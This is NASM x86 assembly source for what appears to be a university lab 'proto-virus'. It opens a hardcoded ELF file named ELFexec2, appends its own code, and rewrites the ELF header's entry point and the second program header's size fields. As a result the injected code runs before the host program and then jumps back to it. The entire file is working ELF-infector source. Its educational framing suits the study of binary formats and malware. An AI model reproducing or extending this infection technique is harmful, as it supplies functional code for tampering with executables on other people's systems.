%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%macro update_field_named 1
	lea ebx, [ebp-second_ph_header_OFFSET]
	add ebx, %1 					; point to the field on the stack

	mov edx, [ebp-virus_code_size_OFFSET]
	mov [ebx], edx					; add size of virus code to the field

	mov edx, [ebp-sizeELFfile_OFFSET]
	add [ebx], edx					; add size of file size to the field

	lea edx, [ebp-second_ph_header_OFFSET]
	add edx, PHDR_offset
	mov ecx, [edx]
	sub [ebx], ecx
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0
%define fd_OFFSET 0
%define magic_OFFSET 4
%define sizeELFfile_OFFSET 4
%define virus_code_size_OFFSET 8 
%define memory_address_OFFSET 12
%define new_entry_point_OFFSET 16
%define old_entry_point_OFFSET 20
%define absolute_OFFSET 24
%define second_ph_header_OFFSET	60

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES           		 ; Set up ebp and reserve space on the stack for local storage
print_message:
	call get_my_loc
	sub ecx, next_i-OutStr			; get current address of OutStr
	write 1, ecx, 32			; print "The lab 9 proto-virus strikes!" to stdout
	cmp eax, 32				; check if the string was printed
	jl Error
open_file:
	call get_my_loc
	sub ecx, next_i-FileName		; get current address of FileName
	mov ebx, ecx
	open ebx, RDWR, 0777			; open file named ELFexec2 (value of label FileName)
check_validity_of_opening:
	mov dword [ebp-fd_OFFSET], eax		; push to stack the fd of the file
	cmp dword [ebp-fd_OFFSET], 0		; check if the open succeeded
	jl Error
check_if_ELF_file:
	lea dword edi, [ebp-magic_OFFSET]	; point to the first free memory in the stack
	read [ebp-fd_OFFSET], edi, 4		; read 4 bytes from file
	cmp eax, 4				; check if the all bytes was read
	jl Error
	mov dword edi, [edi]			; dereference pointer
	cmp dword edi, 0x464c457f 		; check if the file is ELF file
	jnz Error 				
go_to_the_end_of_file:
	lseek [ebp-fd_OFFSET], 0, SEEK_END 	; getting to the end of the file
	cmp eax, 0 				; if not succeed seeking - Error
	jl Error
	mov [ebp-sizeELFfile_OFFSET], eax	; save size of orignial file
	mov ebx, [ebp-fd_OFFSET]

	call get_my_loc
	sub ecx, next_i-_start			; get current address of _start label
	mov edx, ecx

	call get_my_loc
	sub ecx, next_i-virus_end		; get current address of virus_end label
	sub ecx, edx
	mov edx, ecx

	mov [ebp-virus_code_size_OFFSET], edx	; save virus code size on stack

	call get_my_loc
	sub ecx, next_i-_start			; get current address of _start label
write_virus:
	write ebx, ecx, edx			; write virus to the end of the file
	cmp eax, edx				; check if all the bytes was written
	jl Error				; if not - Error

; Task 1
get_memory_address:
	mov ebx, [ebp-fd_OFFSET]
	mov ecx, ENTRY
	add ecx, PHDR_start

; Task 3 - add this line only
	add ecx, PHDR_size			; pass to thee second program header

	add ecx, PHDR_vaddr			; get to the location of virtual address of first header
	lseek ebx, ecx, SEEK_SET	; move to the virtual address start bytes
	lea ecx, [ebp-memory_address_OFFSET]
	read ebx, ecx, 4
	cmp eax, 4
	jl Error
; Task 3
save_absulote_offset_of_second_program_header:
	mov ebx, [ebp-fd_OFFSET]
	mov ecx, ENTRY
	add ecx, PHDR_start
	add ecx, PHDR_size			; pass to thee second program header
	add ecx, PHDR_offset
	lseek ebx, ecx, SEEK_SET 		
	mov ebx, [ebp-fd_OFFSET]
	lea ecx, [ebp-absolute_OFFSET]
	mov edx, 4
	read ebx, ecx, edx
	cmp eax, edx
	jl Error
change_entry_point_in_memory:
	mov ecx, [ebp-memory_address_OFFSET]
	add ecx, [ebp-sizeELFfile_OFFSET]
; Task 3
	sub ecx, [ebp-absolute_OFFSET]		; absulote offset to second ph_header

	mov [ebp-new_entry_point_OFFSET], ecx
write_back_to_file:
	mov ebx, [ebp-fd_OFFSET]
	lseek ebx, ENTRY, SEEK_SET	; move to the virtual address start bytes
	cmp eax, ENTRY
	jl Error
; Task 2
save_old_entry_point:
	mov ebx, [ebp-fd_OFFSET]				
	lea ecx, [ebp-old_entry_point_OFFSET]
	mov edx, 4
	read ebx, ecx, edx					; back-up the old entry point in stack
	cmp eax, edx
	jl Error
write_new_entry_point_to_file:	
	mov ebx, [ebp-fd_OFFSET]
	lseek ebx, ENTRY, SEEK_SET		; move to the virtual address start bytes
	cmp eax, ENTRY
	jl Error
	mov ebx, [ebp-fd_OFFSET]
	lea ecx, [ebp-new_entry_point_OFFSET]
	mov edx, 4
	write ebx, ecx, edx						; write the new entry point to the ELF file header
	cmp eax, edx
	jl Error
; Task 2
write_old_entry_point_to_PreviousEntryPoint:
	call get_my_loc
	sub ecx, next_i-_start
	mov edx, ecx

	call get_my_loc
	sub ecx, next_i-PreviousEntryPoint
	sub ecx, edx
	add ecx, [ebp-sizeELFfile_OFFSET]		; number of bytes to PreviousEntryPoint from start of the file

	mov ebx, [ebp-fd_OFFSET]
	lseek ebx, ecx, SEEK_SET				; getting to the location of PreviousEntryPoint Label

	lea ecx, [ebp-old_entry_point_OFFSET]
	mov edx, 4
	write ebx, ecx, edx					; writing the old entry point in PreviousEntryPoint
; Task 3
copy_second_ph_header_to_stack:
	mov ebx, [ebp-fd_OFFSET]
	mov ecx, ENTRY
	add ecx, PHDR_start				
	add ecx, PHDR_size						; pass the first ph_header, and point to the second ph_header
	lseek ebx, ecx, SEEK_SET			; get to the location of second_ph_header
	lea ecx, [ebp-second_ph_header_OFFSET]
	read ebx, ecx, PHDR_size			; copy second header into stack
	cmp eax, PHDR_size
	jl Error
update_mem_size_field:
	update_field_named PHDR_memsize
update_file_sz_field:
	update_field_named PHDR_filesize
write_back_fields_to_file:
	mov ebx, [ebp-fd_OFFSET]
	mov ecx, ENTRY
	add ecx, PHDR_start
	add ecx, PHDR_size					; pass the first ph_header, and point to the second ph_header	
	lseek ebx, ecx, SEEK_SET			; get to the location of second_ph_header
	lea ecx, [ebp-second_ph_header_OFFSET]
	mov edx, PHDR_size
	write ebx, ecx, edx
	cmp eax, edx
	jl Error

back_to_original_program:
	call get_my_loc
	sub ecx, next_i-PreviousEntryPoint		; get current address of PreviousEntryPoint label
	jmp [ecx]

close_file:
	mov ebx, [ebp-fd_OFFSET]
	close ebx				; close file at the end
	cmp eax, 0
	jl Error

VirusExit:					; exit virus
       exit 0          				; Termination if all is OK and no previous code to jump to
Error:
	sub ecx, next_i-Failstr			; get current address of Failstr
	write 1, ecx, 13			; print "This is a virus" to stdout

	call get_my_loc
	sub ecx, next_i-PreviousEntryPoint		; get current address of virus_end label
	jmp [ecx]


FileName:	db "ELFexec2", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:    db "perhaps not", 10 , 0

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret
	
PreviousEntryPoint: dd VirusExit

virus_end: